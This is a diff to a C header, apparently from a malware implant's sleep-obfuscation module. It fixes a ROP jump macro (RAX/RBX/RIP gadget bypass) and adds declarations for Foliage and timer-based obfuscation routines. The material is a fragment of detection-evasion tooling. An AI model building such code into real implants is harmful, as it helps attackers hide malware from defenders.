@@ -14,12 +14,12 @@
 #define SLEEPOBF_BYPASS_JMPRBX 0x2
 
 #define OBF_JMP( i, p ) \
-    if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {    \
-        Rop[ i ].Rax = U_PTR( p );                  \
-    } if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) {  \
-        Rop[ i ].Rbx = U_PTR( & p );                \
-    } else {                                        \
-        Rop[ i ].Rip = U_PTR( p );                  \
+    if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {         \
+        Rop[ i ].Rax = U_PTR( p );                       \
+    } else if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) {  \
+        Rop[ i ].Rbx = U_PTR( & p );                     \
+    } else {                                             \
+        Rop[ i ].Rip = U_PTR( p );                       \
     }
 
 typedef struct
@@ -37,5 +37,13 @@ typedef struct _SLEEP_PARAM
 } SLEEP_PARAM, *PSLEEP_PARAM;
 
 VOID SleepObf( );
+
+#ifdef SLEEPOBF_USE_FOLIAGE
+VOID FoliageObf( IN PSLEEP_PARAM Param );
+#endif
+
+#ifdef SLEEPOBF_USE_TIMER
+BOOL TimerObf( _In_ ULONG TimeOut, _In_ ULONG Method );
+#endif
 
 #endif
